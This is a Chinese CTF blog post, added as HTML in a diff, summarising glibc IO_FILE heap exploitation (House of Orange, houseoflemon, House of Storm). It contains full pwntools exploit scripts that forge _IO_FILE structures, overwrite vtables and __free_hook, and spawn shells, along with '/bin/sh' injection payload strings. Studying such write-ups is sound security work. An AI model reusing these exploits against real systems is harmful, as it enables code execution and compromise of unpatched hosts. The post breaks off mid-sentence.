@@ -1,0 +1,513 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>IOFILE题目小结</title><meta name="description" content="May the Force be with you"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="源码调试要下载源码得先把sources.list的deb-src开头的注释去掉，更新一下
+sudo apt-get update 
+sudo apt-get upgrade 
+下载源码
+sudo apt-get source libc6-dev
+会报这么一个错，但是不影响用，暂且不管。
+W: Can&amp;#39;t drop privileges for downloading as file &amp;#39;glibc_2.23-0ubuntu11.dsc&amp;#39; couldn&amp;#39;t be accessed by user &amp;#39;_apt&amp;#39;. - pkgAcquire::Run (13: Permission denied)
+在gdb里运行：
+directory ~/glibc/glibc-2..."><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Q1IQ's blog" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Q1IQ's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">IOFILE题目小结</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-text">源码调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seethefile-pwnable"><span class="toc-text">seethefile-pwnable</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9A%E6%9C%AA%E8%A7%A3%E5%86%B3%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9Afd%E6%80%8E%E4%B9%88%E6%9E%84%E9%80%A0%EF%BC%9F"><span class="toc-text">尚未解决的问题：fd怎么构造？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E4%B8%80%E4%B8%AA%E5%BE%88%E5%82%BB%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">遇到一个很傻的问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#houseoforange"><span class="toc-text">houseoforange</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B"><span class="toc-text">改进</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B2"><span class="toc-text">改进2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#houseoflemon"><span class="toc-text">houseoflemon</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">题目分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96menu%E8%84%9A%E6%9C%AC"><span class="toc-text">获取menu脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#houseofstorm"><span class="toc-text">houseofstorm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-text">预备知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-text">利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%B7%E6%83%91"><span class="toc-text">迷惑</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%B6%E8%8E%B7"><span class="toc-text">收获</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-text">后记</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/PWN"><i class="tag post-item-tag">PWN</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">IOFILE题目小结</h1><time class="has-text-grey" datetime="2020-02-19T03:58:15.000Z">2020-02-19</time><article class="mt-2 post-content"><h3 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h3><p>要下载源码得先把sources.list的<code>deb-src</code>开头的注释去掉，更新一下</p>
+<pre><code>sudo apt-get update 
+sudo apt-get upgrade </code></pre>
+<p>下载源码</p>
+<pre><code>sudo apt-get source libc6-dev</code></pre>
+<p>会报这么一个错，但是不影响用，暂且不管。</p>
+<pre><code>W: Can&#39;t drop privileges for downloading as file &#39;glibc_2.23-0ubuntu11.dsc&#39; couldn&#39;t be accessed by user &#39;_apt&#39;. - pkgAcquire::Run (13: Permission denied)</code></pre>
+<p>在gdb里运行：</p>
+<pre><code>directory ~/glibc/glibc-2.23/malloc/</code></pre>
+<h3 id="seethefile-pwnable"><a href="#seethefile-pwnable" class="headerlink" title="seethefile-pwnable"></a>seethefile-pwnable</h3><p>这道题目解法就是改虚表。</p>
+<h4 id="尚未解决的问题：fd怎么构造？"><a href="#尚未解决的问题：fd怎么构造？" class="headerlink" title="尚未解决的问题：fd怎么构造？"></a>尚未解决的问题：fd怎么构造？</h4><p>网上有两种构造方法</p>
+<p>法一：fp的前两个字节+/bin/sh      //fp的前两个字节有太重要的作用，建议不要动，</p>
+<pre><code>&#39;\x86\xb4\xad\xfb&#39;+&#39;||/bin/sh&#39;</code></pre>
+<p>但是我这个fd的前俩字节是’\x88\x24\xad\xfb’，我改成我自己的前俩字节，就跑不通了。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190817171647.png"></p>
+<p>法二：？？？？啥？？？居然能跑通</p>
+<pre><code>&#39;\xff\xff\xff\xff;$0\x00&#39;</code></pre>
+<h4 id="遇到一个很傻的问题"><a href="#遇到一个很傻的问题" class="headerlink" title="遇到一个很傻的问题"></a>遇到一个很傻的问题</h4><p>远程给的maps</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190817165506.png"></p>
+<p>本地maps</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190817165631.png"></p>
+<p>网上说 /proc/self/maps 可以看libc基址，但是我的为什么不显示？因为我目录深，而程序每次只读0x18f个字节，读两次就能读到libc基址了。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190817165906.png"></p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20190817170230.png"></p>
+<p>困扰我好久，可能我傻吧</p>
+<h3 id="houseoforange"><a href="#houseoforange" class="headerlink" title="houseoforange"></a>houseoforange</h3><p>打印结构体的偏移</p>
+<pre><code>p &amp;((struct _IO_FILE_plus*)0)-&gt;vtable
+p &amp;((struct _IO_FILE*)0)-&gt;_chain</code></pre>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200225170039.png"></p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200225170154.png"></p>
+<p>打印结构体内容</p>
+<pre><code>p *_IO_list_all</code></pre>
+<p><code>_IO_FILE</code>相关知识积累</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200225210245.png"></p>
+<pre><code>1)       在malloc出错时，会调用malloc_printerr函数来输出错误信息
+2)       malloc_printerr又会调用__libc_message
+3)       __libc_message又调用abort
+4)       abort则又调用了_IO_flush_all_lockp
+5)       最后_IO_flush_all_lockp中会调用到vtable中的_IO_OVERFLOW函数</code></pre>
+<p><code>_IO_flush_all_lockp</code>源码如下</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200225210951.png"></p>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>build次数共4次，大小限制在0x1000；upgrade共3次，无长度限制溢出，只能更新最近一次build的；有see；无free。</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ol>
+<li>泄露libc；泄露堆地址：申请<code>largebin</code>大小的块，<code>fd_nextsize</code>和<code>bk_nextsize</code>残留在块里，因为目前<code>largebin</code>只有一个，所以都指向自己。</li>
+<li><code>unsorted_bin_attack</code>，改<code>_IO_list_all</code>为<code>main_arena+0x58</code>(<code>unsortedbin</code>是<code>main_arena+0x68</code>)</li>
+<li><code>_IO_file-&gt;_chain</code>的偏移是0x68，<code>main_arena+0x58</code>到<code>small[0x60]</code>的偏移是0x68，所以把块放到<code>small[0x60]</code>就相当于完全获得了一个<code>_IO_FILE</code>。</li>
+</ol>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200225183456.png"></p>
+<ol>
+<li>构造<code>_IO_FILE</code>，需要满足下面条件：</li>
+</ol>
+<p>1）</p>
+<pre><code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></pre>
+<p>或者</p>
+<pre><code>_IO_vtable_offset (fp) == 0 
+&amp;&amp; fp-&gt;_mode &gt; 0 
+&amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></pre>
+<p>2）<code>vtable-&gt;_IO_OVERFLOW</code>要指向<code>system/gadget</code>，指向<code>system</code>的话还要再构造<code>fp</code>开头是<code>&#39;/bin/sh\x00&#39;</code></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *
+debug=1
+context.log_level = &#39;debug&#39;
+if debug:
+    io = process(&#39;./houseoforange&#39;)
+else:
+    io = remote(&quot;&quot;,1234)
+elf = ELF(&#39;./houseoforange&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+s       = lambda data               :io.send(data) 
+sa      = lambda data1,data         :io.sendafter(data1, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda data1,data         :io.sendlineafter(data1, data)
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
+
+def build(length,name,price,color): #4
+    ru(b&#39;Your choice : &#39;) #malloc(0x10)
+    sl(&#39;1&#39;)
+    ru(b&#39;Length of name :&#39;) #&gt;0x1000 -&gt;0x1000 malloc(length)
+    sl(str(length))
+    ru(b&#39;Name :&#39;)
+    s(name)
+    ru(b&#39;Price of Orange:&#39;) #calloc(0x8)
+    sl(price)
+    ru(b&#39;Color of Orange:&#39;)
+    sl(color)
+
+def see():
+    ru(b&#39;Your choice : &#39;)
+    sl(&#39;2&#39;)
+    ru(b&#39;Name of house : &#39;)
+    hi= ru(&#39;\n&#39;)
+    ru(b&#39;House of Orange&#39;)
+    return hi
+
+def upg(length,name,price,color): #3
+    ru(b&#39;Your choice : &#39;)
+    sl(&#39;3&#39;)
+    ru(b&#39;Length of name :&#39;)
+    sl(str(length))
+    ru(b&#39;Name:&#39;)
+    s(name)#bytes.decode(name,&quot;unicode-escape&quot;))
+
+    ru(b&#39;Price of Orange:&#39;)
+    sl(price)
+    ru(b&#39;Color of Orange:&#39;)
+    sl(color)
+
+
+
+build(12,&#39;123&#39;,&#39;1&#39;,&#39;1&#39;)
+
+c=p64(0x11111111)*3+p64(0x21)+p32(0x1)+p32(0x1f)+p64(0x0)#info
+
+payload=c+p64(0x0)
+payload+=p64(0xfa1)
+
+upg(str(len(payload)),payload,&#39;1&#39;,&#39;1&#39;)
+build(0x1000,&#39;123&#39;,&#39;1&#39;,&#39;1&#39;)
+
+#leak libc
+build(0x400,&#39;11111111&#39;,&#39;1&#39;,&#39;1&#39;)
+libc.address=u64((see()[8:]).ljust(8,b&#39;\x00&#39;))-3953032
+print(hex(libc.address))
+print(hex(libc.symbols[&#39;_IO_list_all&#39;]))
+
+#leak heap
+payload=&#39;1&#39;*16
+upg(str(len(payload)),payload,&#39;1&#39;,&#39;1&#39;)
+heapbase=u64((see()[16:]).ljust(8,b&#39;\x00&#39;))-0xc0
+print(hex(heapbase))
+
+#orange
+onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
+c=p64(0)*3
+c+=p64(libc.address+onegadgets[3]) #vtable
+c=c.ljust(0x408,b&#39;\x00&#39;)
+c+=p64(0x21)+p32(0x1)+p32(0x1f)+p64(0x0)#info
+
+iofile=p64(0x0)#b&#39;/bin/sh\x00&#39;  #IOfile / fd
+iofile+=p64(0x61)  #offset(_IO_file-&gt;_chain)=0x68  (small[0x60]-main_arena+0x58)=0x68
+iofile+=p64(libc.address)
+iofile+=p64(libc.symbols[&#39;_IO_list_all&#39;]-0x10)#set _IO_list_all main_arena+0x58
+iofile=iofile.ljust(0x20,b&#39;\x00&#39;)
+iofile+=p64(0)#_IO_file-&gt;_IO_write_base
+iofile+=p64(1)#_IO_file-&gt;_IO_write_ptr
+iofile=iofile.ljust(0xc0,b&#39;\x00&#39;)
+iofile+=p64(0xffffffffffffffff)#_IO_file-&gt;mode
+iofile=iofile.ljust(0xd8,b&#39;\x00&#39;)
+iofile+=p64(heapbase+0xd0)#_IO_file-&gt;vtable
+payload=c+iofile
+upg(str(len(payload)),payload,&#39;1&#39;,&#39;1&#39;)
+
+#getshell
+ru(b&#39;Your choice : &#39;) #malloc(0x10)
+sl(&#39;1&#39;)
+
+io.interactive()</code></pre>
+<h4 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h4><p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200225235806.png"></p>
+<p><a target="_blank" rel="noopener" href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">大佬写的IOFILE构造脚本</a>，因为python3的bytes&amp;str问题我照抄着加了下面的bytes函数。</p>
+<pre><code class="python">    def __bytes__(self):
+        fake_file = b&quot;&quot;
+        with context.local(arch=self.arch):
+            for item_offset in sorted(self.item_offset):
+                if len(fake_file) &lt; item_offset:
+                    fake_file += b&quot;\x00&quot;*(item_offset - len(fake_file))
+                fake_file += pack(self[_IO_FILE_plus[self.arch][item_offset]],word_size=&#39;all&#39;)
+            fake_file += b&quot;\x00&quot;*(self.size - len(fake_file))
+        return fake_file</code></pre>
+<p>exp变得清晰多了。</p>
+<pre><code class="python">#orange
+onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
+c=p64(0)*3
+c+=p64(libc.address+onegadgets[3]) #vtable
+c=c.ljust(0x408,b&#39;\x00&#39;)
+c+=p64(0x21)+p32(0x1)+p32(0x1f)+p64(0x0)#info
+from FILE import *
+context.arch = &#39;amd64&#39;
+iofile = IO_FILE_plus_struct()
+iofile._flags = u64(&#39;/bin/sh\x00&#39;)
+iofile._IO_read_ptr=0x61
+iofile._IO_read_base=libc.symbols[&#39;_IO_list_all&#39;]-0x10
+iofile._IO_write_base=0
+iofile._IO_write_ptr=1
+iofile._mode=0
+iofile.vtable=heapbase+0xd0
+payload=c+bytes(iofile)
+upg(str(len(payload)),payload,&#39;1&#39;,&#39;1&#39;)</code></pre>
+<h4 id="改进2"><a href="#改进2" class="headerlink" title="改进2"></a>改进2</h4><pre><code>def house_of_orange(head_addr, system_addr, io_list_all):
+    payload = b&#39;/bin/sh\x00&#39;
+    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)
+    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4
+    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \
+            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)
+    return payload</code></pre>
+<h3 id="houseoflemon"><a href="#houseoflemon" class="headerlink" title="houseoflemon"></a>houseoflemon</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目给了十块钱买水果，mayer柠檬6块钱，ponderosa柠檬4块钱，买哪个没区别，但你不能买两个mayer，因为你钱不够:P</p>
+<p>第三个功能是advice，可以完成分配（大小十进制的199-8000）、编辑、删除各一次。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200227200059.png"></p>
+<p>买柠檬的信息是一个由一个FILO的双向链表保存，头位于data段。</p>
+<p>增加节点代码：</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200226214116.png"></p>
+<p>删除节点代码：</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200227115917.png"></p>
+<p>而且可以随意修改最新节点的前向指针和后向指针。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200227120519.png"></p>
+<p>这就可以达到一个任意地址写一个固定的值的效果，原理和unsorted_bin_attack一样。利用这一点改global_max_fast，为什么改global_max_fast，因为：</p>
+<p>glibc在free的时候，会通过get_max_fast()获取global_max_fast，小于global_max_fast就根据fastbin_index放到fastbinY里。</p>
+<pre><code>if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast())</code></pre>
+<p>fastbin_index是这样算的，具体就是<code>(size&gt;&gt;4)-2</code>，例如0x20的index是0，具体的算我也没算，我是调试调出来一个数。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200226231858.png"></p>
+<p>就着写博客就仔细算一波。</p>
+<pre><code>main_arena=0x7f6b0ce17b20
+stdout=0x7f6b0ce18620
+main_arena-&gt;fastbinY=0x7f6b0ce17b28
+stdout-&gt;vtable=0x7f6b0ce186f8
+offset=0xbd0
+-&gt;idx=0xbd0/8=0x17a
+-&gt;size=0x20+idx*0x10=0x17c0</code></pre>
+<p>正好。</p>
+<pre><code class="python">from pwn import *
+debug=1
+context.log_level = &#39;debug&#39;
+if debug==1:
+    io = process(&#39;./pwn500&#39;)
+elif debug==0:
+    io = remote(&quot;&quot;,1234)
+elf = ELF(&#39;./pwn500&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+s       = lambda data               :io.send(data) 
+sa      = lambda data1,data         :io.sendafter(data1, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda data1,data         :io.sendlineafter(data1, data)
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
+
+def Meyer(*aa):
+    ru(&#39;Pls input your choice:&#39;)
+    sl(&#39;1&#39;)
+    for a in aa:
+        ru(&#39;Pls Input your choice:&#39;)
+        sl(str(a))
+def Ponderosa(*aa):
+    ru(&#39;Pls input your choice:&#39;)
+    sl(&#39;2&#39;)
+    for a in aa:
+        ru(&#39;Pls Input your choice:&#39;)
+        sl(str(a))
+        if(a==4):
+            ru(&#39;Get Input:&#39;)
+            global c
+            sl(c)
+def Leave(*aa):
+    ru(&#39;Pls input your choice:&#39;)
+    sl(&#39;3&#39;)
+    for a in aa:
+        r()
+        sl(a)
+def Submit():
+    ru(&#39;Pls input your choice:&#39;)
+    sl(&#39;4&#39;)
+    ru(&#39;Pls input your phone number first:&#39;)
+    s(&#39;1&#39;*15)
+    ru(&#39;Ok,Pls input your home address&#39;)
+    sl(&#39;1&#39;*40)    
+    ru(b&#39;OK,your input is:&#39;)
+    return u64((ru(&#39;\x0a&#39;)[40:]).ljust(8,b&#39;\x00&#39;))-224912
+
+libc.address=Submit()
+print(hex(libc.address))
+
+onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
+onegadgets=[283158 ,283242 ,839923 ,840136 ,983716 ,983728 ,987463 ,1009392]
+stdout=0x1460+25*16+28*16#0x17c0-8
+stderr=0x1460+25*16
+#c=b&#39;|sh\x00&#39;.ljust(8,b&#39;\x00&#39;)
+c=p64(libc.symbols[&#39;system&#39;])*30#
+#c+=p64(libc.address+onegadgets[1])*30# #vtable
+
+
+Leave(b&#39;1&#39;,str(stdout),&#39;2&#39;,c,&#39;4&#39;)
+c=b&#39;1&#39;*24
+c+=p64(libc.address+0x3c67f8-0x10)
+
+#change global_max_fast
+Ponderosa(2,4,3,5)
+
+#change stdout-&gt;vtable
+Leave(b&#39;3&#39;)
+
+io.interactive()</code></pre>
+<p>这题也就做到这程度了，可能是因为我没有题目对应的libc，以后再回来看。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200227200646.png"></p>
+<h3 id="获取menu脚本"><a href="#获取menu脚本" class="headerlink" title="获取menu脚本"></a>获取menu脚本</h3><p>因为懒得每次都手打目录，就写了个脚本。</p>
+<pre><code class="python">pattern = re.compile(b&#39;\d\..+&#39;)
+mainmenu = pattern.findall(r())
+ask=&quot;Command:&quot;
+response=&#39;20&#39;
+pattern_fun=re.compile(b&#39;\w+&#39;)
+if mainmenu:
+    for item in mainmenu[:-1]:
+        function=&quot;def &#123;0&#125;(a):\n\tru(&#39;&#123;1&#125;&#39;)\n\tsl(&#39;&#123;2&#125;&#39;)\n&quot;.format(bytes.decode(pattern_fun.findall(item[2:])[0]),ask,bytes.decode(item[0:1]))
+        sl(item[0:1])
+        while(True):
+            receive = r()
+            if(pattern.findall(receive)!=mainmenu):
+            #submenu = pattern.findall(receive)
+            #if submenu:
+            #    print(submenu)
+                sl(response)
+                function+=&quot;\tru(&#39;&#123;0&#125;&#39;)\n&quot;.format(bytes.decode(receive))
+                function+=&quot;\tsl(str(a))&quot;
+            else:
+                break
+        print(function)    
+else:
+    print(&quot;error&quot;)</code></pre>
+<p>效果就是这样，但感觉实在没法通用。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200228103625.png"></p>
+<h3 id="houseofstorm"><a href="#houseofstorm" class="headerlink" title="houseofstorm"></a>houseofstorm</h3><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p><code>__libc_mallopt</code></p>
+<pre><code>int __libc_mallopt(int param_number, int value)
+
+//param_number取值
+#define M_MXFAST 1</code></pre>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200228130031.png"></p>
+<p>mallopt(1,0)就相当于大小小于0的块被放到fastbin里，也就是说fastbin完全禁用。</p>
+<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>在0x13370000处分配了一块0x1000大小的内存，然后在0x13370800读入三个随机数，之后分配得到的addr要和第一个随机数异或后存储，读取时和第一个随机数异或后读取；size和第二个随机数同理。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200303022513.png"></p>
+<p>update里有offbynull。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200228120211.png"></p>
+<p>view需要在特定地址写入特定值才可用。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200303022242.png"></p>
+<p>allocate大小在(0xc,0x1000]之间，用的是calloc；delete是无漏洞的delete。</p>
+<h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><pre><code class="python">from pwn import *
+debug=1
+#context.log_level = &#39;debug&#39;
+if debug:
+    io = process(&#39;./heapstorm.dms&#39;)
+else:
+    io = remote(&quot;&quot;,1234)
+elf = ELF(&#39;./heapstorm.dms&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+s       = lambda data               :io.send(data) 
+sa      = lambda data1,data         :io.sendafter(data1, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda data1,data         :io.sendlineafter(data1, data)
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)
+
+def Allocate(a):
+    ru(&#39;Command:&#39;)
+    sl(&#39;1&#39;)
+    ru(&#39;Size: &#39;)
+    sl(str(a))
+def Update(a,b,c):
+    ru(&#39;Command:&#39;)
+    sl(&#39;2&#39;)
+    ru(&#39;Index: &#39;)
+    sl(str(a))
+    ru(&#39;Size: &#39;)
+    sl(str(b))
+    ru(&#39;Content: &#39;)
+    s(c)
+def Delete(a):
+    ru(&#39;Command:&#39;)
+    sl(&#39;3&#39;)
+    ru(&#39;Index: &#39;)
+    sl(str(a))
+def View(a):
+    ru(&#39;Command:&#39;)
+    sl(&#39;4&#39;)
+    ru(&#39;Index: &#39;)
+    sl(str(a))
+Allocate(0x90-8) #uns0
+Allocate(0x520-8)#1
+Allocate(0x90-8)#2
+Allocate(0x20-8)#3
+Allocate(0x90-8)#4
+Allocate(0x520-8)#5
+Allocate(0x90-8)#6
+Allocate(0x20-8)#7
+Allocate(0x410-8)#8
+Allocate(0x20-8)#9
+Allocate(0x410-8)#10
+
+#fisrt overlap
+Update(1,0x500,b&quot;1&quot;*(0x4f0)+p64(0x500)+p64(0xa1))
+Delete(1)
+Update(0,0x90-8-12,b&quot;1&quot;*(0x90-8-12))
+Allocate(0x40-8)#1
+Delete(1)
+Delete(2)
+Allocate(0x4c0-8)#1 in control
+Allocate(0x5b0-8)#2
+c=b&quot;1&quot;*(0x40-8)+p64(0x4c1)+b&#39;1&#39;*(0x4c0-8)+p64(23*16-0xc0+1)
+Update(2,len(c),c)
+
+#second overlap
+Update(5,0x500,b&quot;1&quot;*(0x4f0)+p64(0x500)+p64(0xa1))
+Delete(5)
+Update(4,0x90-8-12,b&quot;1&quot;*(0x90-8-12))
+Allocate(0x40-8)#5
+Delete(5)
+Delete(6)
+Allocate(0x4c0-8)#5 in control
+Allocate(0x5b0-8)#6
+c=b&quot;1&quot;*(0x40-8)+p64(0x4c1)+b&#39;1&#39;*(0x4c0-8)+p64(23*16-0xc0+1)
+Update(6,len(c),c)
+
+
+#largebin attack --&gt;fake chunk(0x133707f0)
+Delete(1)
+Allocate(0x600-8)#1 cosolidate
+c=b&quot;1&quot;*(0x40-8)+p64(0x4c1)
+c+=p64(0)
+c+=p64(0x13370800-0x10+3-16)#size
+c+=p64(0)
+c+=p64(0x13370808-0x20)#bk
+c+=b&#39;1&#39;*(0x4c0-8-16-16-8)+p64(0x4c0)+p64(23*16-0xc0)
+Update(2,len(c),c)
+
+#a bigger freed chunk in unsorted bin
+#bk-&gt;fake chunk(0x133707f0)
+Delete(5)
+c=b&quot;1&quot;*(0x40-8)+p64(0x4d1)
+c+=p64(0x0)
+c+=p64(0x13370800-0x10)#bk
+c+=b&#39;1&#39;*(0x4d0-8)+p64(0x4d0)+p64(23*16-0xc0-16)
+Update(6,len(c),c)
+
+#1.largebin attack -&gt;fake chunk(0x133707f0) size=0x56
+#2.alloc(0x133707f0)
+Allocate(0x50-8)#5
+
+c=p64(0)*3
+c+=p64(0x13377331)
+c+=p64(0x13370870)#0
+c+=p64(0x100)
+Update(5,len(c),c)
+
+#leak libc
+View(0)
+ru(b&quot;Chunk[0]: &quot;)
+rc=r(16)
+heapbase=u64(rc[8:16])-0x778
+log.success(hex(heapbase))
+
+#leak heap
+c=p64(0x13370800)#5
+c+=p64(0x100)
+c+=p64(heapbase+0x740)#6
+c+=p64(0x500)
+Update(0,len(c),c)
+View(6)
+ru(b&quot;Chunk[6]: &quot;)
+rc=r(16)
+libc.address=u64(rc[0:8])-3953032+1552
+log.success(hex(libc.address))
+
+#free_hook to shell
+onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
+c=p64(0)*3
+c+=p64(0x13377331)
+c+=p64(libc.symbols[&#39;__free_hook&#39;])#0
+c+=p64(0x100)
+c+=p64(heapbase+0x740)#6
+c+=p64(0x500)
+Update(5,len(c),c)
+c=p64(libc.address+onegadgets[1])
+Update(0,len(c),c)
+Delete(1)
+io.interactive()</code></pre>
+<p>在0x133707f0处写入的size是堆的高两位，它会是0x55/0x56，但是必须得是0x56，因为calloc会报错，报错代码在图中第一行：</p>
